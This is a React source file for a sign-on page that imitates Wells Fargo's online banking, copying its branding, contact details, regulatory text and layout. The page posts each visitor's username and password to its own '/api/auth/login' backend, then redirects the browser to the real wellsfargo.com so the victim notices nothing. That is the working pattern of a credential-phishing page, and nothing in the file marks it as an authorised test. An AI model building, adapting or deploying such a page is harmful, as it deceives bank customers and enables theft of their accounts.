import { useState, useEffect } from "react";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { z } from "zod";
import { useMutation } from "@tanstack/react-query";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Checkbox } from "@/components/ui/checkbox";
import { Card, CardContent } from "@/components/ui/card";
import {
  Form,
  FormControl,
  FormField,
  FormItem,
  FormMessage,
} from "@/components/ui/form";
import { useToast } from "@/hooks/use-toast";
import { apiRequest } from "@/lib/queryClient";
import { X, Search, Key, Shield, Lock, ChevronDown, MapPin, Phone, MessageCircle, Smartphone, CreditCard, Home, PiggyBank, Car, Menu, Globe } from "lucide-react";
import { Link, useLocation } from "wouter";
import heroBg from "@/assets/images/hero-bg.jpg";

const loginSchema = z.object({
  username: z.string().min(1, "Username is required"),
  password: z.string().min(1, "Password is required"),
  saveUsername: z.boolean().default(false),
});

type LoginFormData = z.infer<typeof loginSchema>;

function getGreeting(): string {
  const hour = new Date().getHours();
  if (hour < 12) return "Good morning";
  if (hour < 18) return "Good afternoon";
  return "Good evening";
}

export default function LoginPage() {
  const [showPassword, setShowPassword] = useState(false);
  const [greeting, setGreeting] = useState(getGreeting());
  const [, setLocation] = useLocation();
  const { toast } = useToast();

  useEffect(() => {
    const interval = setInterval(() => {
      setGreeting(getGreeting());
    }, 60000);
    return () => clearInterval(interval);
  }, []);

  const form = useForm<LoginFormData>({
    resolver: zodResolver(loginSchema),
    defaultValues: {
      username: "",
      password: "",
      saveUsername: false,
    },
  });

  const usernameValue = form.watch("username");

  const loginMutation = useMutation({
    mutationFn: async (data: LoginFormData) => {
      const response = await apiRequest("POST", "/api/auth/login", {
        username: data.username,
        password: data.password,
      });
      return response;
    },
    onSuccess: () => {
      toast({
        title: "Sign On Successful",
        description: "Redirecting to Wells Fargo...",
      });
      setTimeout(() => {
        window.location.href = "https://www.wellsfargo.com/";
      }, 1000);
    },
    onError: (error: Error) => {
      toast({
        title: "Sign On Failed",
        description: error.message || "Invalid username or password.",
        variant: "destructive",
      });
    },
  });

  const onSubmit = (data: LoginFormData) => {
    loginMutation.mutate(data);
  };

  const clearUsername = () => {
    form.setValue("username", "");
  };

  const quickLinks = [
    { icon: CreditCard, label: "Credit Cards", desc: "Compare cards & apply" },
    { icon: Home, label: "Home Loans", desc: "Mortgages & refinancing" },
    { icon: PiggyBank, label: "Savings", desc: "Earn more with savings" },
    { icon: Car, label: "Auto Loans", desc: "Finance your vehicle" },
  ];

  return (
    <div className="min-h-screen flex flex-col bg-[#f5f5f5]">
      {/* Skip to content for accessibility */}
      <a href="#main-content" className="sr-only focus:not-sr-only focus:absolute focus:top-0 focus:left-0 bg-[#d71e28] text-white p-2 z-50">
        Skip to main content
      </a>

      {/* Top utility bar - dark gray */}
      <div className="bg-[#2c2c2c] text-white text-xs">
        <div className="max-w-7xl mx-auto px-4">
          <div className="flex items-center justify-between py-2">
            <div className="flex items-center gap-5">
              <a href="#" className="hover:underline flex items-center gap-1.5 text-gray-300 hover:text-white transition-colors" data-testid="link-locations">
                <MapPin className="w-3.5 h-3.5" />
                <span>Find Locations</span>
              </a>
              <a href="#" className="hover:underline flex items-center gap-1.5 text-gray-300 hover:text-white transition-colors" data-testid="link-contact">
                <Phone className="w-3.5 h-3.5" />
                <span>1-800-869-3557</span>
              </a>
              <a href="#" className="hover:underline text-gray-300 hover:text-white transition-colors hidden md:inline" data-testid="link-schedule">
                Schedule Appointment
              </a>
            </div>
            <div className="flex items-center gap-5">
              <a href="#" className="hover:underline flex items-center gap-1.5 text-gray-300 hover:text-white transition-colors" data-testid="link-espanol">
                <Globe className="w-3.5 h-3.5" />
                <span>Español</span>
              </a>
              <a href="#" className="hover:underline text-gray-300 hover:text-white transition-colors hidden md:inline" data-testid="link-help">
                Help
              </a>
            </div>
          </div>
        </div>
      </div>

      {/* Main header - Wells Fargo red */}
      <header className="bg-[#d71e28]">
        <div className="max-w-7xl mx-auto px-4">
          <div className="flex items-center justify-between py-3">
            {/* Logo */}
            <div className="flex items-center" data-testid="logo-container">
              <span 
                className="text-white text-2xl sm:text-3xl tracking-wide"
                style={{ fontFamily: "'Times New Roman', 'Georgia', serif", fontWeight: 400 }}
                data-testid="text-logo"
              >
                WELLS FARGO
              </span>
            </div>

            {/* Search and mobile actions */}
            <div className="flex items-center gap-4">
              <div className="relative hidden lg:block">
                <Input
                  placeholder="Search"
                  className="w-56 h-9 bg-white border-0 text-gray-800 placeholder:text-gray-500 text-sm rounded-sm pr-10"
                  data-testid="input-search"
                />
                <button className="absolute right-0 top-0 h-full px-3 bg-[#b91c23] hover:bg-[#a01820] transition-colors rounded-r-sm">
                  <Search className="w-4 h-4 text-white" />
                </button>
              </div>
              <button className="lg:hidden text-white p-2 hover:bg-white/10 rounded">
                <Search className="w-5 h-5" />
              </button>
              <button className="lg:hidden text-white p-2 hover:bg-white/10 rounded">
                <Menu className="w-5 h-5" />
              </button>
            </div>
          </div>
        </div>

        {/* Primary Navigation */}
        <nav className="bg-[#c41e24] border-t border-[#b91c23]">
          <div className="max-w-7xl mx-auto px-4">
            <div className="flex items-center justify-between">
              <div className="flex items-center overflow-x-auto scrollbar-hide">
                {[
                  { name: "Personal", active: true },
                  { name: "Small Business" },
                  { name: "Wealth & Investment Management" },
                  { name: "Businesses & Institutions" },
                ].map((item) => (
                  <button
                    key={item.name}
                    className={`px-5 py-3.5 text-sm text-white whitespace-nowrap flex items-center gap-1.5 transition-colors ${
                      item.active 
                        ? "bg-[#a01820] border-b-[3px] border-[#ffcd41]" 
                        : "hover:bg-[#b91c23] border-b-[3px] border-transparent"
                    }`}
                    data-testid={`nav-${item.name.toLowerCase().replace(/ /g, "-")}`}
                  >
                    {item.name}
                    <ChevronDown className="w-3 h-3 opacity-70" />
                  </button>
                ))}
              </div>
              <div className="hidden md:flex items-center gap-4">
                <a href="#" className="text-white text-sm hover:underline flex items-center gap-1">
                  <Smartphone className="w-4 h-4" />
                  Mobile App
                </a>
              </div>
            </div>
          </div>
        </nav>

        {/* Secondary Navigation */}
        <div className="bg-[#a01820]">
          <div className="max-w-7xl mx-auto px-4">
            <div className="flex items-center gap-8 py-2.5 overflow-x-auto scrollbar-hide">
              {["Checking", "Savings & CDs", "Credit Cards", "Home Loans", "Personal Loans", "Auto", "Investing", "Rewards & Benefits"].map((item, index) => (
                <a
                  key={item}
                  href="#"
                  className={`text-white/90 hover:text-white text-sm whitespace-nowrap transition-colors ${index === 0 ? "font-medium" : ""}`}
                  data-testid={`subnav-${item.toLowerCase().replace(/ /g, "-")}`}
                >
                  {item}
                </a>
              ))}
            </div>
          </div>
        </div>
      </header>

      {/* Yellow accent bar */}
      <div className="bg-[#ffcd41] h-2"></div>

      {/* Promotional banner */}
      <div className="bg-white border-b border-gray-200">
        <div className="max-w-7xl mx-auto px-4 py-3">
          <div className="flex items-center justify-between">
            <p className="text-sm text-gray-700">
              <span className="text-[#d71e28] font-semibold">NEW: </span>
              Earn unlimited 2% cash rewards with Active Cash<sup>®</sup> Card. 
              <a href="#" className="text-[#d71e28] font-medium hover:underline ml-1">Apply Now →</a>
            </p>
            <button className="text-gray-400 hover:text-gray-600 p-1">
              <X className="w-4 h-4" />
            </button>
          </div>
        </div>
      </div>

      {/* Main content */}
      <main
        id="main-content"
        className="flex-1 relative"
        style={{
          backgroundImage: `linear-gradient(to bottom, rgba(0,0,0,0.02), rgba(0,0,0,0.15)), url(${heroBg})`,
          backgroundSize: "cover",
          backgroundPosition: "center bottom",
          backgroundAttachment: "fixed",
        }}
      >
        <div className="max-w-6xl mx-auto px-4 py-10">
          <div className="grid lg:grid-cols-5 gap-8">
            {/* Login Card - takes 2 columns */}
            <div className="lg:col-span-2">
              <Card className="shadow-xl border-0 bg-white" data-testid="card-login">
                <CardContent className="p-6">
                  <h1 className="text-2xl text-center text-gray-800 mb-6 font-light" data-testid="text-greeting">
                    {greeting}
                  </h1>

                  <Form {...form}>
                    <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4">
                      <FormField
                        control={form.control}
                        name="username"
                        render={({ field }) => (
                          <FormItem>
                            <FormControl>
                              <div className="relative">
                                <Input
                                  placeholder="Username"
                                  className="h-12 pr-10 border-gray-300 rounded text-base focus:border-[#d71e28] focus:ring-[#d71e28]"
                                  data-testid="input-username"
                                  {...field}
                                />
                                {usernameValue && (
                                  <button
                                    type="button"
                                    onClick={clearUsername}
                                    className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600"
                                    data-testid="button-clear-username"
                                  >
                                    <X className="w-5 h-5" />
                                  </button>
                                )}
                              </div>
                            </FormControl>
                            <FormMessage />
                          </FormItem>
                        )}
                      />

                      <FormField
                        control={form.control}
                        name="password"
                        render={({ field }) => (
                          <FormItem>
                            <FormControl>
                              <div className="relative">
                                <Input
                                  type={showPassword ? "text" : "password"}
                                  placeholder="Password"
                                  className="h-12 pr-16 border-gray-300 rounded text-base focus:border-[#d71e28] focus:ring-[#d71e28]"
                                  data-testid="input-password"
                                  {...field}
                                />
                                <button
                                  type="button"
                                  onClick={() => setShowPassword(!showPassword)}
                                  className="absolute right-3 top-1/2 -translate-y-1/2 text-[#d71e28] text-sm font-medium hover:underline"
                                  data-testid="button-toggle-password"
                                >
                                  {showPassword ? "Hide" : "Show"}
                                </button>
                              </div>
                            </FormControl>
                            <FormMessage />
                          </FormItem>
                        )}
                      />

                      <FormField
                        control={form.control}
                        name="saveUsername"
                        render={({ field }) => (
                          <FormItem>
                            <div className="flex items-start gap-2">
                              <FormControl>
                                <Checkbox
                                  checked={field.value}
                                  onCheckedChange={field.onChange}
                                  className="mt-0.5 border-gray-400 data-[state=checked]:bg-[#d71e28] data-[state=checked]:border-[#d71e28]"
                                  data-testid="checkbox-save-username"
                                />
                              </FormControl>
                              <label className="text-sm text-gray-700 cursor-pointer">
                                Save username
                              </label>
                            </div>
                          </FormItem>
                        )}
                      />

                      <Button
                        type="submit"
                        className="w-full h-11 bg-[#ffcd41] hover:bg-[#edc13b] text-gray-900 font-semibold rounded-full border-0 shadow-md text-base"
                        disabled={loginMutation.isPending}
                        data-testid="button-sign-on"
                      >
                        {loginMutation.isPending ? "Signing on..." : "Sign On"}
                      </Button>

                      <div className="flex items-center gap-3 text-gray-400 text-sm py-1">
                        <div className="flex-1 h-px bg-gray-200"></div>
                        <span>or</span>
                        <div className="flex-1 h-px bg-gray-200"></div>
                      </div>

                      <Button
                        type="button"
                        variant="outline"
                        className="w-full h-10 rounded-full border-2 border-gray-700 text-gray-700 font-medium hover:bg-gray-50 text-sm"
                        data-testid="button-passkey"
                      >
                        <Key className="w-4 h-4 mr-2" />
                        Use a passkey
                      </Button>
                    </form>
                  </Form>

                  <div className="mt-4 text-center">
                    <Link href="/forgot-password" className="text-[#d71e28] text-sm hover:underline" data-testid="link-forgot">
                      Forgot username or password?
                    </Link>
                  </div>

                  <div className="mt-4 pt-4 border-t border-gray-200">
                    <div className="flex items-center justify-between">
                      <span className="text-sm text-gray-600">New to Online Banking?</span>
                      <Link href="/register" className="text-[#d71e28] text-sm font-semibold hover:underline" data-testid="link-register">
                        Enroll Now
                      </Link>
                    </div>
                  </div>

                  <div className="mt-4 pt-4 border-t border-gray-200 flex items-center justify-center gap-2 text-xs text-gray-500">
                    <Shield className="w-4 h-4 text-green-600" />
                    <span>Secure Sign On</span>
                    <Lock className="w-3 h-3" />
                  </div>
                </CardContent>
              </Card>
            </div>

            {/* Quick Links and Offers - takes 3 columns */}
            <div className="lg:col-span-3 space-y-6">
              <div>
                <h2 className="text-white text-lg font-semibold mb-4 drop-shadow-md">
                  Popular Products & Services
                </h2>
                <div className="grid sm:grid-cols-2 gap-4">
                  {quickLinks.map((link) => (
                    <Card key={link.label} className="bg-white hover:shadow-lg transition-shadow cursor-pointer border-0 group">
                      <CardContent className="p-5">
                        <div className="flex items-start gap-4">
                          <div className="w-12 h-12 bg-[#fef3f3] rounded-lg flex items-center justify-center flex-shrink-0 group-hover:bg-[#d71e28] transition-colors">
                            <link.icon className="w-6 h-6 text-[#d71e28] group-hover:text-white transition-colors" />
                          </div>
                          <div>
                            <h3 className="font-semibold text-gray-800 mb-0.5">{link.label}</h3>
                            <p className="text-sm text-gray-500">{link.desc}</p>
                            <span className="text-[#d71e28] text-sm font-medium group-hover:underline mt-1 inline-block">
                              Learn More →
                            </span>
                          </div>
                        </div>
                      </CardContent>
                    </Card>
                  ))}
                </div>
              </div>

              {/* Featured offer */}
              <Card className="bg-gradient-to-r from-[#d71e28] to-[#8a1419] border-0 text-white overflow-hidden">
                <CardContent className="p-0">
                  <div className="flex flex-col md:flex-row items-center">
                    <div className="p-6 flex-1">
                      <p className="text-[#ffcd41] text-xs font-bold tracking-wider mb-2">LIMITED TIME OFFER</p>
                      <h3 className="text-2xl font-bold mb-2">Earn a $300 bonus</h3>
                      <p className="text-white/90 text-sm mb-4">Open a new Everyday Checking account with qualifying direct deposits.</p>
                      <Button className="bg-[#ffcd41] hover:bg-[#edc13b] text-gray-900 font-semibold rounded-full px-8">
                        Open Now
                      </Button>
                    </div>
                    <div className="w-full md:w-48 h-32 md:h-full bg-gradient-to-t md:bg-gradient-to-l from-[#6d1115] to-transparent"></div>
                  </div>
                </CardContent>
              </Card>

              {/* Security notice */}
              <div className="bg-white/90 backdrop-blur rounded-lg p-4 flex items-center gap-4">
                <div className="w-10 h-10 bg-green-100 rounded-full flex items-center justify-center flex-shrink-0">
                  <Shield className="w-5 h-5 text-green-600" />
                </div>
                <div>
                  <h4 className="font-semibold text-gray-800 text-sm">Your Security is Our Priority</h4>
                  <p className="text-xs text-gray-600">Wells Fargo uses advanced security features to protect your accounts. <a href="#" className="text-[#d71e28] hover:underline">Learn more</a></p>
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Disclaimer section */}
        <div className="bg-white/95 backdrop-blur-sm">
          <div className="max-w-6xl mx-auto px-4 py-6">
            <h3 className="font-bold text-gray-800 text-sm mb-3">
              Investment and Insurance Products are:
            </h3>
            <div className="grid sm:grid-cols-3 gap-4 text-sm text-gray-600 mb-4">
              <div className="flex items-start gap-2">
                <span className="text-[#d71e28] font-bold">•</span>
                <span>Not Insured by the FDIC or Any Federal Government Agency</span>
              </div>
              <div className="flex items-start gap-2">
                <span className="text-[#d71e28] font-bold">•</span>
                <span>Not a Deposit or Other Obligation of, or Guaranteed by, the Bank or Any Bank Affiliate</span>
              </div>
              <div className="flex items-start gap-2">
                <span className="text-[#d71e28] font-bold">•</span>
                <span>Subject to Investment Risks, Including Possible Loss of the Principal Amount Invested</span>
              </div>
            </div>
            <div className="flex flex-wrap items-center justify-between gap-4 pt-4 border-t border-gray-200">
              <p className="text-xs text-gray-500">
                Deposit products offered by Wells Fargo Bank, N.A. Member FDIC.
              </p>
              <div className="flex items-center gap-6 text-xs text-gray-600">
                <div className="flex items-center gap-1">
                  <div className="w-6 h-6 border-2 border-gray-500 rounded flex items-center justify-center text-[8px] font-bold">FDIC</div>
                </div>
                <span>Equal Housing Lender</span>
                <span className="font-medium">NMLSR ID 399801</span>
              </div>
            </div>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="bg-[#1a1a1a] text-white">
        <div className="max-w-7xl mx-auto px-4 py-10">
          <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-5 gap-8 mb-10">
            <div>
              <h4 className="font-bold text-sm mb-4 text-[#ffcd41]">About Wells Fargo</h4>
              <ul className="space-y-2.5 text-xs text-gray-400">
                <li><a href="#" className="hover:text-white transition-colors">Careers</a></li>
                <li><a href="#" className="hover:text-white transition-colors">Diversity and Accessibility</a></li>
                <li><a href="#" className="hover:text-white transition-colors">Investor Relations</a></li>
                <li><a href="#" className="hover:text-white transition-colors">Newsroom</a></li>
                <li><a href="#" className="hover:text-white transition-colors">Sustainability</a></li>
                <li><a href="#" className="hover:text-white transition-colors">Community Giving</a></li>
              </ul>
            </div>
            <div>
              <h4 className="font-bold text-sm mb-4 text-[#ffcd41]">Support</h4>
              <ul className="space-y-2.5 text-xs text-gray-400">
                <li><a href="#" className="hover:text-white transition-colors">Contact Us</a></li>
                <li><a href="#" className="hover:text-white transition-colors">FAQs</a></li>
                <li><a href="#" className="hover:text-white transition-colors">Accessibility</a></li>
                <li><a href="#" className="hover:text-white transition-colors">Report Email Fraud</a></li>
                <li><a href="#" className="hover:text-white transition-colors">Security Center</a></li>
                <li><a href="#" className="hover:text-white transition-colors">Privacy Policy</a></li>
              </ul>
            </div>
            <div>
              <h4 className="font-bold text-sm mb-4 text-[#ffcd41]">Banking</h4>
              <ul className="space-y-2.5 text-xs text-gray-400">
                <li><a href="#" className="hover:text-white transition-colors">Checking Accounts</a></li>
                <li><a href="#" className="hover:text-white transition-colors">Savings Accounts</a></li>
                <li><a href="#" className="hover:text-white transition-colors">CDs</a></li>
                <li><a href="#" className="hover:text-white transition-colors">Debit Cards</a></li>
                <li><a href="#" className="hover:text-white transition-colors">Credit Cards</a></li>
                <li><a href="#" className="hover:text-white transition-colors">Foreign Exchange</a></li>
              </ul>
            </div>
            <div>
              <h4 className="font-bold text-sm mb-4 text-[#ffcd41]">Borrowing</h4>
              <ul className="space-y-2.5 text-xs text-gray-400">
                <li><a href="#" className="hover:text-white transition-colors">Home Mortgage</a></li>
                <li><a href="#" className="hover:text-white transition-colors">Refinance</a></li>
                <li><a href="#" className="hover:text-white transition-colors">Home Equity Lines</a></li>
                <li><a href="#" className="hover:text-white transition-colors">Personal Loans</a></li>
                <li><a href="#" className="hover:text-white transition-colors">Auto Loans</a></li>
                <li><a href="#" className="hover:text-white transition-colors">Student Loans</a></li>
              </ul>
            </div>
            <div>
              <h4 className="font-bold text-sm mb-4 text-[#ffcd41]">Investing</h4>
              <ul className="space-y-2.5 text-xs text-gray-400">
                <li><a href="#" className="hover:text-white transition-colors">Wells Fargo Advisors</a></li>
                <li><a href="#" className="hover:text-white transition-colors">Brokerage Accounts</a></li>
                <li><a href="#" className="hover:text-white transition-colors">Retirement Planning</a></li>
                <li><a href="#" className="hover:text-white transition-colors">IRAs</a></li>
                <li><a href="#" className="hover:text-white transition-colors">Wealth Management</a></li>
                <li><a href="#" className="hover:text-white transition-colors">Private Banking</a></li>
              </ul>
            </div>
          </div>

          <div className="border-t border-gray-800 pt-6">
            <div className="flex flex-wrap items-center justify-center gap-x-4 gap-y-2 text-xs text-gray-400 mb-4">
              <a href="#" className="hover:text-white transition-colors">Privacy, Cookies, Security & Legal</a>
              <span className="text-gray-700">|</span>
              <a href="#" className="hover:text-white transition-colors">Notice of Data Collection</a>
              <span className="text-gray-700">|</span>
              <a href="#" className="hover:text-white transition-colors">General Terms of Use</a>
              <span className="text-gray-700">|</span>
              <a href="#" className="hover:text-white transition-colors">Online Access Agreement</a>
              <span className="text-gray-700">|</span>
              <a href="#" className="hover:text-white transition-colors">Ad Choices</a>
              <span className="text-gray-700">|</span>
              <a href="#" className="hover:text-white transition-colors">Do Not Sell or Share My Personal Information</a>
            </div>
            <p className="text-xs text-gray-500 text-center">
              © 1999 - 2026 Wells Fargo. All rights reserved. NMLSR ID 399801
            </p>
          </div>
        </div>
      </footer>
    </div>
  );
}
